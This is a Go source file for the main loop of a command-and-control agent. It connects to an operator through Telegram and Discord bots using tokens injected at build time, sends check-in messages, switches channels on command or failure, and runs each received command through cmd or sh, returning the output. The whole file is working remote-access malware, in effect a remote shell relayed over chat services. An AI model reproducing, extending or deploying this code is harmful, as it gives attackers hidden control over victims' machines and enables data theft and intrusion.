package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"

	"agent/channels/discord"
	"agent/channels/telegram"
	"agent/core"
)

// ─────────────────────────────────────────
// C2 configuration — injected at compile time via:
//   go build -ldflags="-X main.telegramToken=XXX -X main.telegramChatID=YYY -X main.discordToken=ZZZ"
// ─────────────────────────────────────────
var (
	telegramToken  = "PAYLOAD_NOT_CONFIGURED"
	telegramChatID = "0"
	discordToken   = "PAYLOAD_NOT_CONFIGURED"
)

func main() {
	// Validate tokens were injected at compile time
	if telegramToken == "PAYLOAD_NOT_CONFIGURED" || discordToken == "PAYLOAD_NOT_CONFIGURED" {
		log.Fatal("Agent not configured — tokens were not injected at build time")
	}

	cfg := core.LoadConfig()

	// Parse chat ID from string (injected via -ldflags)
	chatID, err := strconv.ParseInt(telegramChatID, 10, 64)
	if err != nil {
		log.Fatalf("Invalid TELEGRAM_CHAT_ID: %v", err)
	}

	// Generate deterministic agent identity (hash of token + hostname)
	agentID := core.AgentID(telegramToken)
	log.Printf("Agent ID: %s", agentID)

	// Build all available channels
	channelMap := buildChannelMap(agentID, chatID)
	if len(channelMap) == 0 {
		log.Fatal("No channels available — cannot operate")
	}

	// Context for clean shutdown via OS signals
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() {
		stop := make(chan os.Signal, 1)
		signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)
		<-stop
		log.Println("Shutdown signal received")
		cancel()
	}()

	// Start the resilient channel loop
	activeChannel := cfg.PrimaryChannel
	runWithSwitching(ctx, channelMap, activeChannel, agentID, cfg)
}

// ─────────────────────────────────────────
// Channel map builder
// ─────────────────────────────────────────

func buildChannelMap(agentID string, chatID int64) map[string]core.C2Channel {
	channels := make(map[string]core.C2Channel)

	channels["telegram"] = telegram.NewClient(telegramToken, chatID, agentID, executeCommand)
	log.Printf("Telegram channel available")

	channels["discord"] = discord.NewClient(discordToken, agentID, executeCommand)
	log.Printf("Discord channel available")

	return channels
}

// ─────────────────────────────────────────
// Main loop — connect, check-in, listen, switch
// ─────────────────────────────────────────

func runWithSwitching(ctx context.Context, channels map[string]core.C2Channel, startChannel string, agentID string, cfg *core.AgentConfig) {
	activeChannelName := startChannel

	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		ch, exists := channels[activeChannelName]
		if !exists {
			log.Printf("Channel '%s' not found — trying fallback", activeChannelName)
			activeChannelName = pickFallback(channels, activeChannelName)
			if activeChannelName == "" {
				log.Fatal("No channels available for fallback")
			}
			continue
		}

		log.Printf("Connecting to channel: %s", ch.Name())

		if err := ch.Connect(); err != nil {
			log.Printf("[%s] Connect failed: %v — trying fallback", ch.Name(), err)
			activeChannelName = pickFallback(channels, activeChannelName)
			if activeChannelName == "" {
				log.Printf("All channels exhausted — waiting %v before retry", cfg.RetryInterval)
				time.Sleep(cfg.RetryInterval)
				activeChannelName = startChannel // reset and try again
			}
			continue
		}

		log.Printf("[%s] Connected successfully", ch.Name())

		// Send CHECKIN on the active channel
		checkinMsg := core.BuildCheckin(agentID)
		if err := ch.SendMessage(checkinMsg); err != nil {
			log.Printf("[%s] Failed to send CHECKIN: %v", ch.Name(), err)
		} else {
			log.Printf("[%s] CHECKIN sent", ch.Name())
		}

		// Listen — blocks until error, context cancel, or SWITCH
		err := ch.Listen(ctx)

		ch.Disconnect()

		// Check if this was a SWITCH command
		if targetChannel, isSwitchErr := core.IsSwitchError(err); isSwitchErr {
			log.Printf("[%s] Switching to channel: %s", ch.Name(), targetChannel)
			activeChannelName = targetChannel

			// Connect to new channel and send SWITCHACK + CHECKIN
			newCh, exists := channels[targetChannel]
			if !exists {
				log.Printf("Requested channel '%s' not available — staying on %s", targetChannel, ch.Name())
				activeChannelName = ch.Name()
				continue
			}

			if err := newCh.Connect(); err != nil {
				log.Printf("[%s] Switch failed to connect: %v — falling back", targetChannel, err)
				activeChannelName = pickFallback(channels, targetChannel)
				continue
			}

			// Send SWITCHACK and CHECKIN on the new channel
			switchAck := fmt.Sprintf("SWITCHACK|%s|%s", agentID, targetChannel)
			newCh.SendMessage(switchAck)
			newCh.SendMessage(checkinMsg)
			log.Printf("[%s] SWITCHACK + CHECKIN sent", targetChannel)

			// Listen on new channel
			err = newCh.Listen(ctx)
			newCh.Disconnect()

			// If another switch happens, loop will handle it
			if nextTarget, isSwitchErr := core.IsSwitchError(err); isSwitchErr {
				activeChannelName = nextTarget
				continue
			}
		}

		// If context was cancelled, exit cleanly
		if ctx.Err() != nil {
			return
		}

		// Channel died — retry
		log.Printf("[%s] Channel lost — retrying in %v", activeChannelName, cfg.RetryInterval)
		time.Sleep(cfg.RetryInterval)
	}
}

// pickFallback returns the name of the first channel that isn't the current one.
func pickFallback(channels map[string]core.C2Channel, current string) string {
	for name := range channels {
		if name != current {
			return name
		}
	}
	return ""
}

// ─────────────────────────────────────────
// Shell executor (shared across all channels)
// ─────────────────────────────────────────

func executeCommand(cmd string) string {
	var command *exec.Cmd

	if runtime.GOOS == "windows" {
		command = exec.Command("cmd", "/C", cmd)
	} else {
		command = exec.Command("sh", "-c", cmd)
	}

	out, err := command.CombinedOutput()

	if err != nil {
		if len(out) > 0 {
			return fmt.Sprintf("%s\nExit error: %s", strings.TrimSpace(string(out)), err.Error())
		}
		return fmt.Sprintf("Error: %s", err.Error())
	}

	output := strings.TrimSpace(string(out))
	if output == "" {
		return "Command executed (no output)"
	}
	return output
}
